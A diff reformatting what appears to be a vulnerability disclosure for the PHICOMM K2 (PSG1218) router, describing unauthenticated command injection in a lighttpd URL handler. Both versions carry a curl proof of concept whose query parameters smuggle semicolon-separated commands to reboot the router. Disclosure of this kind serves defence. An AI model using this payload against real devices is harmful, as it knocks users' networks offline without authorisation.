@@ -2,11 +2,20 @@ vendor:PHICOMM
 product:K2(PSG1218)
 version:V22.5.11.5 and earlier	
 type:remote code execution
-description:There is a url which we can access without credentials in an ajax function, and then our automated vulnerability detection tool 
-            discovered a remote code execution in this url handling function in lighthttpd. This vulnerability affects about 600, 000 devices.
-poc: curl 'http://ip:port/LocalMACConfig.asp?action=set&MAC=1&IP=;&DeviceRename=1&isBind=1&ifType=reboot&BlockUser=-f;&UpMax=0&DownMax=0'
-     (this poc can reboot the router, resulting in ddos.)
 author:Yuan Ming
 institution:Beihang University
+
+
+Vulnerability description
+-------------------------
+There is a url which we can access without credentials in an ajax function.
+And then our automated vulnerability detection tool discovered a remote code execution in this url handling function in lighthttpd. 
+This vulnerability affects about 600, 000 devices.
+
+
+POC: 
+curl 'http://ip:port/LocalMACConfig.asp?action=set&MAC=1&IP=;&DeviceRename=1&isBind=1&ifType=reboot&BlockUser=-f;&UpMax=0&DownMax=0'
+(this poc can reboot the router, resulting in ddos.)
+
   
            
